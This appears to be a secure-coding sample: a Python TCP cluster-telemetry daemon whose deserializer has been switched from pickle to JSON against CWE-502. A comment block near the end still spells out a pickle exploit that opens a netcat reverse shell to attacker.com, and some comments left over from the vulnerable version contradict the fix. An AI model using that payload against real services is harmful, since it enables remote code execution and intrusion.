import os
import struct
import pickle
import socket
import sqlite3
import logging
import threading
import socketserver
from datetime import datetime

# Configure logging for the Internal Cluster Management Node
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - ClusterDaemon - %(levelname)s - %(message)s'
)
logger = logging.getLogger("NodeManager")

DB_FILE = "cluster_state.db"

def init_cluster_db():
    """Initializes the SQLite database for tracking cluster node telemetry."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE node_telemetry (
            node_id TEXT PRIMARY KEY,
            last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
            cpu_usage REAL,
            mem_usage REAL,
            status TEXT
        )
    ''')
    
    # Pre-populate with mock cluster nodes
    mock_nodes = [
        ('node_worker_01', datetime.now().isoformat(), 45.2, 1024.5, 'ONLINE'),
        ('node_worker_02', datetime.now().isoformat(), 88.9, 4096.0, 'WARNING')
    ]
    cursor.executemany('''
        INSERT INTO node_telemetry (node_id, last_seen, cpu_usage, mem_usage, status)
        VALUES (?, ?, ?, ?, ?)
    ''', mock_nodes)
    
    conn.commit()
    conn.close()
    logger.info("Cluster telemetry database initialized.")

def update_node_state(node_id: str, cpu: float, mem: float, status: str):
    """Updates or inserts the telemetry data for a specific cluster node."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO node_telemetry (node_id, cpu_usage, mem_usage, status, last_seen) 
            VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
            ON CONFLICT(node_id) DO UPDATE SET 
            cpu_usage=excluded.cpu_usage, 
            mem_usage=excluded.mem_usage, 
            status=excluded.status,
            last_seen=CURRENT_TIMESTAMP
        ''', (node_id, cpu, mem, status))
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error updating node {node_id}: {e}")

class TelemetryPacket:
    """Represents a telemetry update sent from a worker node."""
    def __init__(self, node_id, cpu_usage, mem_usage, status):
        self.node_id = node_id
        self.cpu_usage = cpu_usage
        self.mem_usage = mem_usage
        self.status = status

def deserialize_telemetry_packet(raw_bytes: bytes, client_address: str) -> TelemetryPacket:
    """
    SECURE: Uses JSON instead of pickle to prevent Unsafe Deserialization (CWE-502).
    """
    import json
    
    logger.info(f"Deserializing secure incoming telemetry payload from {client_address}")
    
    try:
        # Secure: We replace the unsafe pickle module with standard json.
        # json.loads() only parses primitive data structures (dicts, lists, strings, numbers)
        # and strictly prevents arbitrary object instantiation or remote code execution.
        payload_str = raw_bytes.decode('utf-8')
        packet_dict = json.loads(payload_str)
        
        # Safely and manually reconstruct the TelemetryPacket object from the parsed dictionary
        if isinstance(packet_dict, dict) and all(k in packet_dict for k in ("node_id", "cpu_usage", "mem_usage", "status")):
            packet = TelemetryPacket(
                node_id=str(packet_dict["node_id"]),
                cpu_usage=float(packet_dict["cpu_usage"]),
                mem_usage=float(packet_dict["mem_usage"]),
                status=str(packet_dict["status"])
            )
            logger.debug(f"Telemetry packet decoded successfully for node: {packet.node_id}")
            return packet
        else:
            logger.warning(f"Decoded JSON from {client_address} is missing required TelemetryPacket attributes.")
            return None
            
    except (json.JSONDecodeError, UnicodeDecodeError) as e:
        logger.error(f"Failed to parse telemetry payload as JSON from {client_address}: {e}")
        return None
    except ValueError as e:
        logger.error(f"Invalid data types in telemetry payload from {client_address}: {e}")
        return None
    except Exception as e:
        logger.error(f"Unexpected error deserializing packet from {client_address}: {e}")
        return None

class ClusterManagementHandler(socketserver.BaseRequestHandler):
    """TCP Handler for receiving incoming cluster telemetry over raw sockets."""
    
    def handle(self):
        client_ip = self.client_address[0]
        logger.info(f"New connection established from node at {client_ip}")
        
        try:
            # Protocol definition: 4-byte big-endian integer defining payload length, 
            # followed by the actual serialized payload data.
            raw_length = self.request.recv(4)
            if not raw_length or len(raw_length) < 4:
                logger.warning(f"Connection closed prematurely by {client_ip}")
                return
                
            payload_length = struct.unpack('>I', raw_length)[0]
            
            # Basic sanitization to prevent excessive memory allocation attacks
            if payload_length > 1024 * 1024:
                logger.warning(f"Payload too large from {client_ip}: {payload_length} bytes")
                self.request.sendall(b"ERR_PAYLOAD_TOO_LARGE\n")
                return
                
            # Read the exact length of the payload from the socket buffer
            payload_data = b""
            while len(payload_data) < payload_length:
                chunk = self.request.recv(min(4096, payload_length - len(payload_data)))
                if not chunk:
                    break
                payload_data += chunk
                
            if len(payload_data) != payload_length:
                logger.warning(f"Incomplete payload received from {client_ip}")
                return
                
            # Pass the untrusted raw TCP payload directly to the vulnerable function
            packet = deserialize_telemetry_packet(payload_data, client_ip)
            
            if packet:
                update_node_state(packet.node_id, packet.cpu_usage, packet.mem_usage, packet.status)
                self.request.sendall(b"ACK\n")
            else:
                self.request.sendall(b"ERR_INVALID_PACKET\n")
                
        except ConnectionResetError:
            logger.warning(f"Connection reset by peer {client_ip}")
        except struct.error:
            logger.error(f"Malformed packet header received from {client_ip}")
        except Exception as e:
            logger.error(f"Unexpected error handling TCP request from {client_ip}: {e}")

class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    """Allows handling multiple TCP connections concurrently."""
    pass

if __name__ == "__main__":
    init_cluster_db()
    
    HOST, PORT = "0.0.0.0", 9999
    server = ThreadedTCPServer((HOST, PORT), ClusterManagementHandler)
    
    logger.info(f"Starting Threaded Cluster Management TCP Daemon on {HOST}:{PORT}")
    
    # Example Malicious Trigger:
    # 1. Attacker crafts a malicious pickle payload locally:
    #    class Exploit:
    #        def __reduce__(self):
    #            import os
    #            return (os.system, ('nc -e /bin/sh attacker.com 4444',))
    #    payload = pickle.dumps(Exploit())
    #
    # 2. Attacker prefixes the payload with its 4-byte length and sends it over raw TCP:
    #    import struct, socket
    #    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #    sock.connect(("127.0.0.1", 9999))
    #    sock.sendall(struct.pack('>I', len(payload)) + payload)
    
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()
    
    try:
        # Keep the main thread alive
        server_thread.join()
    except KeyboardInterrupt:
        logger.info("Shutting down Cluster Management Daemon gracefully...")
        server.shutdown()
        server.server_close()
